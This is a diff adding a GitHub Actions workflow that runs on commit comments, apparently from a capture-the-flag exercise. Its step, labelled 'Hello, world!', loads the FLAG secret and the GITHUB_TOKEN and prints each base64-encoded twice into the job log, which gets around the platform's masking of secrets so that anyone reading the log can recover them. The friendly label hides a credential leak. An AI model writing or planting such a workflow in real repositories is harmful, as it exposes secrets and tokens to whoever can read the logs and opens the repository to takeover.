@@ -1,0 +1,17 @@
+name: REMOTE
+on: [commit_comment]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Hello, world!
+      env:
+        GITHUB_ACTOR: ${{ github.ACTOR }}
+        GITHUB_REPOSITORY: ${{ github.repository }}
+        GITHUB_SHA: ${{ github.sha }}
+        FLAG: ${{ secrets.FLAG }}
+        MY_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        echo heythere
+        echo $FLAG | base64 | base64
+        echo $MY_TOKEN | base64 | base64
